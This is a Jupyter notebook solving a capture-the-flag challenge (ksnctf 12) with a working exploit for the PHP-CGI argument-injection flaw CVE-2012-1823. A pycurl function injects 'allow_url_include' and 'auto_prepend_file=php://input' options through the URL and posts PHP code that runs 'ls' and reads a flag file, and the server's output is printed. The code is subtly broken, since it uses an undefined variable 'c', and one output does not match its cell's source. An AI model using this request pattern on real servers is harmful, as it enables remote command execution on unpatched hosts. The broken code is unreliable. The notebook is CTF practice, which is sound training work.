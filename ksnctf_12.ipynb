{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "http://ctfq.sweetduet.info:10080/~q12/\n",
    "https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html\n",
    "\n",
    "http://ctfq.sweetduet.info:10080/~q12/?-s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pycurl in /home/nbuser/anaconda3_501/lib/python3.6/site-packages (7.43.0)\n",
      "\u001b[31mgrpcio 1.11.0 has requirement protobuf>=3.5.0.post1, but you'll have protobuf 3.4.1 which is incompatible.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip install pycurl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import pycurl\n",
    "from io import BytesIO\n",
    "\n",
    "def postCommand(command):\n",
    "    buffer = BytesIO()\n",
    "    curl = pycurl.Curl()\n",
    "    curl.setopt(c.WRITEDATA, buffer)\n",
    "    curl.setopt(curl.URL, 'http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input')\n",
    "    curl.setopt(pycurl.POSTFIELDS, command)\n",
    "    curl.perform()\n",
    "\n",
    "    body = buffer.getvalue()\n",
    "    print(body.decode('iso-8859-1'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "flag_flag_flag.txt\n",
      "index.php\n",
      "php.cgi\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "  <head>\n",
      "    <meta charset=\"utf-8\">\n",
      "    <title>Clock</title>\n",
      "    <style>\n",
      "      body\n",
      "      {\n",
      "        background: black;\n",
      "      }\n",
      "      p\n",
      "      {\n",
      "        color: red;\n",
      "        font-size: xx-large;\n",
      "        font-weight: bold;\n",
      "        text-align: center;\n",
      "        margin-top: 200px;\n",
      "      }\n",
      "    </style>\n",
      "  </head>\n",
      "  <body>\n",
      "    <p>2012:1823:20:18:05:10:12:52:10:23:29:18:29</p>\n",
      "  </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "postCommand(\"<?php system('ls'); ?>\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<br />\n",
      "<b>Warning</b>:  readfile(flag_flag_flag.tx): failed to open stream: No such file or directory in <b>php://input</b> on line <b>1</b><br />\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "  <head>\n",
      "    <meta charset=\"utf-8\">\n",
      "    <title>Clock</title>\n",
      "    <style>\n",
      "      body\n",
      "      {\n",
      "        background: black;\n",
      "      }\n",
      "      p\n",
      "      {\n",
      "        color: red;\n",
      "        font-size: xx-large;\n",
      "        font-weight: bold;\n",
      "        text-align: center;\n",
      "        margin-top: 200px;\n",
      "      }\n",
      "    </style>\n",
      "  </head>\n",
      "  <body>\n",
      "    <p>2012:1823:20:18:05:10:12:55:39:55:24:08:32</p>\n",
      "  </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "postCommand(\"<?php readfile('flag_flag_flag.txt'); ?>\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.6",
   "language": "python",
   "name": "python36"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
